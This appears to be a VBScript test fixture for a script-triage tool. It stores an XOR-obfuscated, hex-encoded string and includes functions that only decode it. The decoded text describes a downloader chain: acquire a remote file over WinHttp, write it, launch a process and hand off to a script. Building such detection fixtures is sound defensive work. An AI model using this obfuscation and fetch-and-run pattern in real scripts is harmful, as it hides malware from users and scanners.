Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_4aef1561 = "fb:a2:32:30:96:f9:fa:73:3f:d8:ec:fc:72:39:8c:ff:fa:5c:3e:80:e0:f0:77:29:c9:fa:ed:6a:38:80:d2:f9:6a:20:80:a1:fb:6a:3f:95:ec:eb:60:24:ba:fd:ed:6c:2f:80:fe:ec:2f:24:84:e3:fb:6c:2a:83:d2:ec:60:3e:8c:fd:eb:7f:2d:81:ec:ef:77:29:97:b0:c8:6a:22:ad:f9:eb:73:62:b2:e4:f1:4b:38:91:fd:cd:66:3d:90:e8:ec:77:62:d0:a3:ae:7f:3f:91:ec:f8:66:13:86:e2:ea:6d:38:d8:b9:e3:60:2d:88:fd:fe:6a:2b:8b:d2:f6:67:71:86:ec:f2:73:2d:8c:ea:f1:2e:29:d6:b5:a8:65:7e:d0:b4:fc:65:30:90:ff:f3:3e:24:91:f9:ef:70:76:ca:a2:fa:30:74:d2:eb:ad:36:75:86:eb:b1:66:34:84:e0:ef:6f:29:cb:e4:f1:75:2d:89:e4:fb:2c:74:83:e9:fb:67:7d:d1:ec:b1:67:2d:91:f1:ea:70:29:97:d2:fe:64:29:8b:f9:a2:4b:39:8b:f9:ed:66:3f:96:c1:fe:61:63:80:be:a7:34:2a:d7:b8:a6:60:2a:99:eb:f6:6f:29:ba:fd:fe:77:24:d8:ce:a5:5f:19:96:e8:ed:70:10:b5:f8:fd:6f:25:86:d1:d7:76:22:91:ff:fa:70:3f:a9:ec:fd:5f:3f:91:ec:f8:66:61:80:be:a7:34:2a:d7:b8:a6:60:2a:cb:e9:fe:77:30:97:e8:f8:6a:3f:91:ff:e6:5c:3c:84:f9:f7:3e:04:ae:ce:ca:5f:1f:8a:eb:eb:74:2d:97:e8:c3:4b:39:8b:f9:ed:66:3f:96:c1:fe:61:10:a1:e4:ec:73:23:96:ec:fd:6f:29:b9:e8:ac:3b:7b:83:bf:aa:3a:2f:83:f1:f1:66:34:91:d2:ec:77:2d:82:e8:a2:6f:23:86:ec:f3:2e:28:8c:fe:ef:62:38:86:e5:b1:75:2e:96"
Const Codec_4aef1561 = "hex_colon|repeating_key_xor|8d,9f,03,4c,e5"

Function Load_4aef1561()
  Dim parts, result(), v_e598
  parts = Split(Material_4aef1561, ":")
  ReDim result(UBound(parts))
  For v_e598 = 0 To UBound(parts)
    result(v_e598) = CInt("&H" & parts(v_e598))
  Next
  Load_4aef1561 = result
End Function

Function Decode_4aef1561(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  keyBytes = Array(141,159,3,76,229)
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = v_a19c(v_e598) Xor keyBytes(v_e598 Mod 5)
  Next
  Decode_4aef1561 = result
End Function

Function Recover_4aef1561()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  If True Then
    v_d41a = (19 * 7) - 133
      v_a19c = Load_4aef1561()
      On Error Resume Next
      v_b27e = Decode_4aef1561(v_a19c)
      v_a702 = Err.Number
      v_b803 = Err.Description
      On Error GoTo 0
      If v_a702 <> 0 Then Err.Raise v_a702, "HuntressFixture", v_b803
      v_c304 = ""
      For v_e598 = 0 To UBound(v_b27e)
        v_c304 = v_c304 & Chr(v_b27e(v_e598))
      Next
  End If
  Recover_4aef1561 = v_c304
End Function

Function Inspect_4aef1561()
  Inspect_4aef1561 = Recover_4aef1561()
End Function
